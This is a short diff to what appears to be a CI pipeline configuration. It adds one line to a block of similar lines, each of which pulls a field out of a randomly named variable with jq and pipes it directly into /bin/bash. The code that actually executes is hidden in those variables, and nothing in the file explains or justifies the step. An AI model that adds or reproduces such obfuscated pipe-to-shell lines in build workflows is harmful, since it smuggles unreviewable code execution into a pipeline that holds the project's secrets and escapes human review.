@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$c72218" | jq -r .xee583 | /bin/bash
           printf '%s' "$oqi062" | jq -r .czlm184 | /bin/bash
           echo $yrztj74 | jq -r .tkq21966 | /bin/bash
+          echo $lm2667 | jq -r .dabba44 | /bin/bash
 
       - name: Upload artifact
         if: always()
